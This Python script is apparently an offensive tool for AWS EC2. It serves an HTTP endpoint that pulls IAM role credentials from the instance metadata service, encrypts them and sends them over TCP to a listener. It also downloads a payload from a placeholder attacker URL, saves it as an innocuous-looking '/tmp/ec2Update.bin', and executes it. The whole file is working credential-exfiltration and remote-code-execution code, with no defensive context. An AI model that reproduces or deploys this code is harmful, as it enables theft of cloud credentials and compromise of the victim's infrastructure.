from http.server import BaseHTTPRequestHandler, HTTPServer
import socket
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import requests
import json
import subprocess
from concurrent.futures import ThreadPoolExecutor

# Configuration
RECIPIENT_IP = '' # listener IP for session token
SEND_TOKEN_PORT = 1234  # Port for sending the session token
KEY = b'11111111111111111111111111111111'  # AES-256 key, must be 32 bytes
PORT = 8000  # Port for the HTTP server
DOWNLOAD_URL = 'http://youripgoeshere:9876/yourpayload.bin'
FILE_PATH = '/tmp/ec2Update.bin' # payload if you choose to use this 

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            creds = get_iam_role_credentials()
            if creds:
                # Use ThreadPoolExecutor to run tasks concurrently
                with ThreadPoolExecutor(max_workers=2) as executor:
                    executor.submit(download_and_execute_file)
                    executor.submit(send_data_over_tcp, encrypt_data(creds), RECIPIENT_IP, SEND_TOKEN_PORT)
                response = {'status': 'Token sent successfully.'}
            else:
                response = {'status': 'Failed to retrieve or send token.'}
            self.wfile.write(json.dumps(response).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

def encrypt_data(data):
    cipher = AES.new(KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    iv = cipher.iv
    return iv + ct_bytes

def send_data_over_tcp(data, ip, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))
        s.sendall(data)

def get_iam_role_credentials():
    try:
        token_response = requests.put("http://169.254.169.254/latest/api/token",
                                      headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
                                      timeout=2)
        if token_response.status_code == 200:
            token = token_response.text
            iam_role_name_response = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                                                  headers={"X-aws-ec2-metadata-token": token},
                                                  timeout=2)
            if iam_role_name_response.status_code == 200:
                iam_role_name = iam_role_name_response.text
                creds_response = requests.get(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{iam_role_name}",
                                              headers={"X-aws-ec2-metadata-token": token},
                                              timeout=2)
                return creds_response.text if creds_response.status_code == 200 else None
    except Exception as e:
        print(f"Error retrieving IAM role credentials: {e}")
    return None

def download_and_execute_file():
    try:
        print(f"Downloading file from {DOWNLOAD_URL}")
        response = requests.get(DOWNLOAD_URL)
        response.raise_for_status()

        with open(FILE_PATH, 'wb') as file:
            file.write(response.content)

        subprocess.run(['chmod', '+x', FILE_PATH], check=True)
        print("Executing the downloaded file...")
        subprocess.run([FILE_PATH], check=True)
    except Exception as e:
        print(f"Error during file download or execution: {e}")

def run(server_class=HTTPServer, handler_class=RequestHandler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting httpd on port {port}...')
    httpd.serve_forever()

if __name__ == '__main__':
    run(port=PORT)

